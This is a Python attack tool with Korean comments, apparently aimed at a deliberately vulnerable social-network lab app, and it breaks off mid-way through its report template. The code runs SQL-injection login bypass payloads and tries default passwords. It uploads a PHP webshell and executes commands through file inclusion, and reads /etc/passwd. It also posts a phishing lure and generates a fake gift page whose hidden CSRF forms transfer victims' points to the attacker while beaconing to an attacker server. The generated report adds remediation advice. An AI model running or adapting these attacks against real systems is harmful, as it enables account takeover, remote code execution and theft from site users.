import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import time
import json
import re
from datetime import datetime

class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []
    
    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)
    
    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)
    
    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def test_sql_injection_login(self):
        """SQL Injection - password 필드 공격"""
        self.print_section("SQL Injection - Login Bypass")
        
        login_url = f"{self.base_url}/login.php"
        
        print("[*] Testing SQL Injection payloads...")
        
        payloads = [
            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
            ('admin', "' or '1'='1", 'ss'),
        ]
        
        for username, password, desc in payloads:
            try:
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                    print(f"[+] SUCCESS! Logged in")
                    print(f"    Final URL: {response.url}")
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                            print(f"    Current Points: {self.current_points}P")
                    
                    self.logged_in = True
                    self.get_attacker_user_id()
                    
                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': desc,
                        'impact': 'CRITICAL - Authentication bypass, full account takeover',
                        'cvss_score': 9.8
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)
                    
                    self.log_event(
                        'SQL_INJECTION',
                        'Successfully bypassed authentication using SQL injection',
                        'CRITICAL',
                        {
                            'payload': f"username={username}, password={password}",
                            'method': desc,
                            'account': 'admin',
                            'points': self.current_points
                        }
                    )
                    
                    return True
                else:
                    print(f"[-] Failed - Still on: {response.url}")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print("\n[*] Trying default credentials...")
        default_creds = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
        ]
        
        for username, password in default_creds:
            try:
                print(f"[*] Trying: {username}/{password}")
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                
                if 'index.php' in response.url or response.url.endswith('/www/') or response.url.endswith('/www'):
                    print(f"[+] SUCCESS with default credentials")
                    self.logged_in = True
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                    
                    self.get_attacker_user_id()
                    
                    self.log_event(
                        'WEAK_CREDENTIALS',
                        f'Logged in with default credentials: {username}/{password}',
                        'HIGH',
                        {'username': username, 'password': password}
                    )
                    
                    return True
            except:
                continue
        
        return False
    
    def test_file_upload_rce(self):
        """File Upload - 웹쉘 업로드"""
        self.print_section("File Upload - Webshell Upload")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        upload_url = f"{self.base_url}/upload.php"
        file_url = f"{self.base_url}/file.php"
        
        webshell_code = b'<?php system($_GET["cmd"]); ?>'
        
        test_files = [
            ('shell.php5', 'PHP5 extension'),
            ('shell.phtml', 'PHTML extension'),
            ('shell.php3', 'PHP3 extension'),
        ]
        
        print("[*] Uploading webshell (bypassing .php filter)...")
        
        for filename, desc in test_files:
            try:
                print(f"\n[*] Trying: {filename} ({desc})")
                
                files = {'file': (filename, webshell_code, 'application/x-php')}
                response = self.session.post(upload_url, files=files, allow_redirects=True)
                
                if 'success' in response.text.lower() or 'uploaded' in response.text.lower() or filename in response.text:
                    print(f"[+] File uploaded successfully")
                    
                    print(f"\n[*] Testing webshell execution via LFI...")
                    commands = ['whoami', 'id', 'pwd']
                    
                    for cmd in commands:
                        try:
                            params = {'name': filename, 'cmd': cmd}
                            cmd_response = self.session.get(file_url, params=params, timeout=10)
                            
                            soup = BeautifulSoup(cmd_response.text, 'html.parser')
                            content_div = soup.find('div', class_='file-content')
                            
                            if content_div:
                                output = content_div.get_text(strip=True)
                                
                                if output and '<?php' not in output and len(output) < 200:
                                    print(f"\n[+] SUCCESS! Command executed: {cmd}")
                                    print(f"    Output: {output}")
                                    
                                    self.uploaded_webshell = filename
                                    
                                    vuln_info = {
                                        'upload_url': upload_url,
                                        'filename': filename,
                                        'command': cmd,
                                        'output': output,
                                        'access_url': f"{file_url}?name={filename}&cmd={cmd}",
                                        'impact': 'CRITICAL - Remote Code Execution achieved',
                                        'cvss_score': 10.0
                                    }
                                    self.vulnerabilities['file_upload'].append(vuln_info)
                                    
                                    self.log_event(
                                        'FILE_UPLOAD_RCE',
                                        f'Successfully uploaded webshell and executed commands',
                                        'CRITICAL',
                                        {
                                            'filename': filename,
                                            'bypass_method': desc,
                                            'test_command': cmd,
                                            'output': output[:100]
                                        }
                                    )
                                    
                                    return True
                            
                        except Exception as e:
                            print(f"[-] Command execution error: {str(e)[:50]}")
                            continue
                    
                else:
                    print(f"[-] Upload failed or blocked")
                    
            except Exception as e:
                print(f"[-] Upload error: {str(e)[:50]}")
        
        return False
    
    def test_lfi(self):
        """LFI - Local File Inclusion"""
        self.print_section("LFI - Local File Inclusion")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        file_url = f"{self.base_url}/file.php"
        
        print("[*] Testing LFI payloads...")
        
        lfi_payloads = [
            ("../../etc/passwd", "root:", "passwd file (2 levels)"),
            ("/etc/passwd", "root:", "passwd file (absolute)"),
            ("../../etc/hosts", "localhost", "hosts file"),
        ]
        
        if self.uploaded_webshell:
            lfi_payloads.append((self.uploaded_webshell, "www-data", f"Uploaded webshell: {self.uploaded_webshell}"))
        
        success_count = 0
        
        for payload, indicator, desc in lfi_payloads:
            try:
                print(f"\n[*] Testing: {desc}")
                print(f"    Payload: {payload}")
                
                if payload == self.uploaded_webshell:
                    params = {'name': payload, 'cmd': 'whoami'}
                else:
                    params = {'name': payload}
                    
                response = self.session.get(file_url, params=params, timeout=10)
                
                if indicator in response.text:
                    print(f"[+] SUCCESS! File read: {indicator} found")
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    content = soup.find('div', class_='file-content')
                    if content:
                        text = content.get_text(strip=True)
                        print(f"    Content preview: {text[:100]}...")
                    
                    success_count += 1
                    
                    vuln_info = {
                        'url': file_url,
                        'payload': payload,
                        'description': desc,
                        'impact': 'HIGH - Arbitrary file read, information disclosure',
                        'cvss_score': 7.5
                    }
                    self.vulnerabilities['lfi'].append(vuln_info)
                    
                    self.log_event(
                        'LFI',
                        f'Successfully read file: {desc}',
                        'HIGH',
                        {
                            'payload': payload,
                            'file_type': desc,
                            'preview': text[:100] if content else ''
                        }
                    )
                else:
                    print(f"[-] File not found or blocked")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")
        
        print(f"\n[*] LFI Results: {success_count}/{len(lfi_payloads)} successful")
        return success_count > 0
    
    def test_xss_csrf_combined(self):
        """XSS + CSRF Combined Attack"""
        self.print_section("XSS + CSRF - Malicious Post with Direct Link")
        
        if not self.logged_in:
            print("[-] Login required")
            return False
        
        if not self.attacker_user_id:
            print("[-] Attacker user ID not found")
            return False
        
        post_url = f"{self.base_url}/new_post.php"
        attacker_url = f"{self.attacker_server}/fake-gift"
        
        print(f"[*] Creating malicious post with link to attacker server")
        print(f"[*] Attacker User ID: {self.attacker_user_id}")
        print(f"[*] Target URL: {attacker_url}")
        
        payload = f'''🎁 특별 이벤트! 🎁

무료 10,000 포인트 받기!
지금 클릭하세요: {attacker_url}

선착순 100명! 서두르세요!'''
        
        try:
            print(f"\n[*] Posting malicious content with direct link")
            print(f"    Content: {payload[:100]}...")
            
            data = {'content': payload}
            response = self.session.post(post_url, data=data, allow_redirects=True, timeout=10)
            
            if 'index.php' in response.url:
                print(f"[+] Post created!")
                
                time.sleep(0.5)
                check = self.session.get(f"{self.base_url}/index.php")
                
                if attacker_url in check.text:
                    print(f"[+] SUCCESS! Malicious post is live on feed!")
                    print(f"[+] Attack URL: {attacker_url}")
                    print(f"\n[*] Attack Flow:")
                    print(f"    1. Victim views main feed (index.php)")
                    print(f"    2. Victim clicks the link")
                    print(f"    3. Redirected to {attacker_url}")
                    print(f"    4. fake-gift page performs CSRF attack")
                    print(f"    5. Gifts sent to attacker (ID: {self.attacker_user_id})")
                    print(f"    6. Monitor at: {self.attacker_server}")
                    
                    vuln_info = {
                        'url': post_url,
                        'payload': payload,
                        'description': 'Social engineering + CSRF attack via malicious post',
                        'attack_type': 'phishing_csrf',
                        'target_url': attacker_url,
                        'attacker_id': self.attacker_user_id,
                        'impact': 'CRITICAL - CSRF allows unauthorized actions on behalf of victim',
                        'cvss_score': 8.8
                    }
                    self.vulnerabilities['xss'].append(vuln_info)
                    
                    self.log_event(
                        'XSS_CSRF',
                        'Malicious post created with CSRF attack link',
                        'CRITICAL',
                        {
                            'post_url': post_url,
                            'attack_url': attacker_url,
                            'attacker_id': self.attacker_user_id,
                            'method': 'Social engineering phishing'
                        }
                    )
                    
                    return True
                else:
                    print(f"[-] Link not found in feed")
            else:
                print(f"[-] Post creation failed")
                
        except Exception as e:
            print(f"[-] Error: {str(e)[:100]}")
        
        return False
    
    def generate_fake_gift_page(self):
        """개선된 fake-gift 페이지 생성"""
        print("\n[*] Generating fake-gift.html for attacker server...")
        
        if not self.attacker_user_id:
            print("[-] Cannot generate: attacker user ID unknown")
            self.attacker_user_id = "1"
            print(f"[*] Using default attacker ID: 1 (admin)")
        
        fake_gift_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎁 무료 포인트 받기!</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        h1 {{
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .gift-icon {{
            font-size: 100px;
            animation: bounce 1s infinite;
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: scale(1.1);
        }}
        .loading {{
            display: none;
            margin-top: 20px;
            color: #667eea;
            font-size: 1.1em;
        }}
        .success {{
            display: none;
            color: #28a745;
            font-size: 1.5em;
            margin-top: 20px;
        }}
        #status {{
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">자동으로 포인트를 받는 중...</div>
        <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
        <div class="loading" id="loading">⏳ 처리 중...</div>
        <div class="success" id="success">✅ 완료!</div>
    </div>
    
    <div id="csrfForms"></div>
    
    <script>
        let attackExecuted = false;
        const ATTACKER_ID = '{self.attacker_user_id}';
        const TARGET_SNS = '{self.base_url}';
        
        window.onload = function() {{
            fetch('{self.attacker_server}/notify?event=page_loaded&time=' + new Date().toISOString())
                .catch(() => {{}});
            
            document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
            
            setTimeout(() => {{
                executeCSRF();
            }}, 2000);
        }};
        
        function claimGift() {{
            if (attackExecuted) return;
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            executeCSRF();
        }}
        
        function executeCSRF() {{
            if (attackExecuted) return;
            attackExecuted = true;
            
            document.getElementById('status').innerHTML = '포인트 전송 중...';
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const amounts = [5000, 3000, 1000, 500, 300, 100];
            let formHTML = '';
            
            amounts.forEach((amount, index) => {{
                formHTML += `
                    <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" style="display:none" target="iframe${{index}}">
                        <input type="hidden" name="send_gift" value="1">
                        <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
                        <input type="hidden" name="gift_type" value="diamond">
                        <input type="hidden" name="points" value="${{amount}}">
                        <input type="hidden" name="message" value="Event Gift ${{amount}}P">
                    </form>
                    <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
                `;
            }});
            
            formHTML += `
                <img src="${{TARGET_SNS}}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
                     style="display:none" 
                     onload="notifyProfileChange()">
            `;
            
            document.getElementById('csrfForms').innerHTML = formHTML;
            
            amounts.forEach((amount, index) => {{
                setTimeout(() => {{
                    const form = document.getElementById('csrfForm' + index);
                    if (form) {{
                        form.submit();
                        console.log('[+] Submitted form for ' + amount + 'P');
                        
                        fetch('{self.attacker_server}/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                            .catch(() => {{}});
                        
                        document.getElementById('status').innerHTML = 
                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                    }}
                }}, index * 500);
            }});
            
            setTimeout(() => {{
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').innerHTML = 
                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                document.getElementById('success').style.display = 'block';
                document.getElementById('status').style.display = 'none';
                
                fetch('{self.attacker_server}/notify?event=csrf_completed&attempts=' + amounts.length)
                    .catch(() => {{}});
                
                console.log('[+] All CSRF attempts completed');
            }}, amounts.length * 500 + 1000);
        }}
        
        function notifyProfileChange() {{
            console.log('[+] Profile changed via GET CSRF');
            fetch('{self.attacker_server}/notify?event=profile_changed&method=GET')
                .catch(() => {{}});
        }}
    </script>
</body>
</html>"""
        
        with open("fake-gift.html", 'w', encoding='utf-8') as f:
            f.write(fake_gift_html)
        
        print(f"[+] fake-gift.html saved!")
        
        self.log_event(
            'SETUP',
            'Generated fake-gift.html attack page',
            'INFO',
            {
                'filename': 'fake-gift.html',
                'attacker_id': self.attacker_user_id,
                'attack_server': self.attacker_server
            }
        )

    def generate_html_report(self):
        """상세한 HTML 리포트 생성"""
        end_time = datetime.now()
        duration = (end_time - self.start_time).seconds
        
        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        critical_count = sum(1 for vuln_list in self.vulnerabilities.values() 
                           for vuln in vuln_list 
                           if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0)
        high_count = sum(1 for vuln_list in self.vulnerabilities.values() 
                        for vuln in vuln_list 
                        if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0)
        
        html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>보안 진단 리포트 - Vulnerable SNS</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', 'Malgun Gothic', sans-serif;
            background: #f5f7fa;
            padding: 40px 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            box-shadow: 0 0 30px rgba(0,0,0,0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .header .meta {{
            opacity: 0.9;
            font-size: 0.95em;
        }}
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 40px;
            background: #f8f9fa;
        }}
        .summary-box {{
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .summary-box .number {{
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .summary-box .label {{
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .critical {{ color: #dc3545; }}
        .high {{ color: #fd7e14; }}
        .info {{ color: #17a2b8; }}
        .section {{
            padding: 40px;
        }}
        .section h2 {{
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #333;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }}
        .vuln-card {{
            background: white;
            border: 1px solid #e0e0e0;
            border-left: 5px solid #dc3545;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
        }}
        .vuln-card.high {{
            border-left-color: #fd7e14;
        }}
        .vuln-card.medium {{
            border-left-color: #ffc107;
        }}
        .vuln-card h3 {{
            color: #333;
            font-size: 1.3em;
            margin-bottom: 15px;
        }}
        .vuln-detail {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-size: 0.9em;
        }}
        .vuln-detail strong {{
            color: #667eea;
        }}
        .cvss-badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
            margin-left: 10px;
        }}
        .cvss-critical {{
            background: #dc3545;
            color: white;
        }}
        .cvss-high {{
            background: #fd7e14;
            color: white;
        }}
        .timeline {{
            position: relative;
            padding-left: 40px;
        }}
        .timeline::before {{
            content: '';
            position: absolute;
            left: 15px;
            top: 0;
            bottom: 0;
            width: 2px;
            background: #e0e0e0;
        }}
        .timeline-item {{
            position: relative;
            margin-bottom: 30px;
        }}
        .timeline-item::before {{
            content: '';
            position: absolute;
            left: -29px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #667eea;
            border: 3px solid white;
            box-shadow: 0 0 0 2px #667eea;
        }}
        .timeline-item.critical::before {{
            background: #dc3545;
            box-shadow: 0 0 0 2px #dc3545;
        }}
        .timeline-item.high::before {{
            background: #fd7e14;
            box-shadow: 0 0 0 2px #fd7e14;
        }}
        .timeline-content {{
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .timeline-time {{
            color: #888;
            font-size: 0.85em;
            margin-bottom: 5px;
        }}
        .timeline-title {{
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }}
        .timeline-desc {{
            color: #666;
            font-size: 0.9em;
        }}
        .recommendations {{
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }}
        .recommendations h3 {{
            color: #856404;
            margin-bottom: 15px;
        }}
        .recommendations ul {{
            list-style: none;
            padding-left: 0;
        }}
        .recommendations li {{
            padding: 8px 0;
            color: #856404;
        }}
        .recommendations li::before {{
            content: '✓ ';
            color: #28a745;
            font-weight: bold;
            margin-right: 8px;
        }}
        .footer {{
            background: #2d3436;
            color: white;
            text-align: center;
            padding: 30px;
        }}
        code {{
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        @media print {{
            .no-print {{ display: none; }}
            body {{ background: white; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 웹 애플리케이션 보안 진단 리포트</h1>
            <div class="meta">
                <p><strong>대상 시스템:</strong> {self.base_url}</p>
                <p><strong>진단 일시:</strong> {self.start_time.strftime('%Y년 %m월 %d일 %H:%M:%S')}</p>
                <p><strong>소요 시간:</strong> {duration}초</p>
                <p><strong>진단 도구:</strong> VulnerableSNS Security Assessment Tool v1.0</p>
            </div>
        </div>

        <div class="summary">
            <div class="summary-box">
                <div class="number critical">{total_vulns}</div>
                <div class="label">총 취약점 수</div>
            </div>
            <div class="summary-box">
                <div class="number critical">{critical_count}</div>
                <div class="label">치명적 (Critical)</div>
            </div>
            <div class="summary-box">
                <div class="number high">{high_count}</div>
                <div class="label">높음 (High)</div>
            </div>
            <div class="summary-box">
                <div class="number info">{len(self.attack_timeline)}</div>
                <div class="label">공격 시도 횟수</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Executive Summary (경영진 요약)</h2>
            <p style="line-height: 1.8; color: #555; margin-bottom: 20px;">
                본 보안 진단에서는 대상 웹 애플리케이션에서 <strong class="critical">{total_vulns}개의 보안 취약점</strong>이 발견되었습니다. 
                이 중 <strong class="critical">{critical_count}개는 치명적(Critical)</strong> 수준으로, 즉각적인 조치가 필요합니다.
                주요 취약점으로는 <strong>SQL Injection, 파일 업로드 취약점(RCE), CSRF, XSS, LFI</strong> 등이 확인되었으며, 
                이를 통해 <strong>인증 우회, 원격 코드 실행, 사용자 계정 탈취</strong> 등이 가능한 상태입니다.
            </p>
            <p style="line-height: 1.8; color: #555;">
                <strong>권고사항:</strong> 발견된 모든 취약점에 대한 즉각적인 패치 작업이 필요하며, 
                특히 Critical 등급의 취약점은 24시간 이내에 수정되어야 합니다.
            </p>
        </div>

        <div class="section">
            <h2>🔴 발견된 취약점 상세 분석</h2>
"""

        # SQL Injection 취약점
        if self.vulnerabilities['sql_injection']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">1️⃣ SQL Injection (SQLi)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['sql_injection'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>SQL Injection #{idx} - 인증 우회
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong><br>
                    Username: <code>{vuln['username']}</code><br>
                    Password: <code>{vuln['password']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 기법:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>Prepared Statement (파라미터화된 쿼리) 사용</li>
                        <li>입력값 검증 및 화이트리스트 기반 필터링</li>
                        <li>ORM (Object-Relational Mapping) 프레임워크 사용</li>
                        <li>최소 권한 원칙에 따른 DB 계정 설정</li>
                    </ul>
                </div>
            </div>
"""

        # File Upload 취약점
        if self.vulnerabilities['file_upload']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">2️⃣ Unrestricted File Upload (파일 업로드 취약점)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>File Upload RCE #{idx} - 원격 코드 실행
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>업로드 URL:</strong> <code>{vuln['upload_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>업로드된 웹쉘:</strong> <code>{vuln['filename']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>테스트 명령:</strong> <code>{vuln['command']}</code><br>
                    <strong>실행 결과:</strong> <code>{vuln['output']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>접근 URL:</strong> <code>{vuln['access_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>화이트리스트 기반 확장자 검증 (블랙리스트 방식 지양)</li>
                        <li>파일 MIME 타입 검증 (Magic Number 확인)</li>
                        <li>업로드 파일을 웹 루트 외부에 저장</li>
                        <li>업로드 파일명 랜덤화 및 실행 권한 제거</li>
                        <li>파일 크기 제한 설정</li>
                    </ul>
                </div>
            </div>
"""

        # LFI 취약점
        if self.vulnerabilities['lfi']:
            html_content += """
            <h3 style="color: #fd7e14; margin-top: 30px;">3️⃣ Local File Inclusion (LFI)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['lfi'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-high'
                html_content += f"""
            <div class="vuln-card high">
                <h3>LFI #{idx} - 임의 파일 읽기
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong> <code>{vuln['payload']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>읽은 파일:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>파일 경로를 사용자 입력에서 직접 가져오지 않기</li>
                        <li>화이트리스트 기반 파일명 검증</li>
                        <li>realpath() 함수로 정규화된 경로 확인</li>
                        <li>basename() 사용하여 디렉토리 순회 방지</li>
                        <li>chroot jail 또는 open_basedir 설정</li>
                    </ul>
                </div>
            </div>
"""

        # XSS/CSRF 취약점
        if self.vulnerabilities['xss']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">4️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>CSRF #{idx} - 사용자 권한 도용
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 유형:</strong> {vuln['attack_type']}
                </div>
                <div class="vuln-detail">
                    <strong>공격자 서버:</strong> <code>{vuln['target_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>페이로드 내용:</strong><br>
                    <code style="display: block; white-space: pre-wrap; padding: 10px; background: #f8f9fa;">
{vuln['payload'][:200]}...</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>CSRF 토큰 구현 및 검증 (모든 상태 변경 요청에 적용)</li>
                        <li>SameSite 쿠키 속성 설정</li>
                        <li>Referer/Origin 헤더 검증</li>
                        <li>중요한 작업에 재인증 요구</li>
                        <li>GET 요청으로 상태 변경 금지</li>
                        <li>XSS 방어: 출력 시 htmlspecialchars() 사용</li>
                        <li>Content Security Policy (CSP) 헤더 설정</li>
                    </ul>
                </div>
            </div>
"""

        # 공격 타임라인
        html_content += """
        </div>

        <div class="section">
            <h2>⏱️ 공격 타임라인</h2>
            <div class="timeline">
"""
        for event in self.attack_timeline:
            severity_class = event['severity'].lower()
            html_content += f"""
                <div class="timeline-item {severity_class}">
                    <div class="timeline-content">
                        <div class="timeline-time">{event['timestamp']}</div>
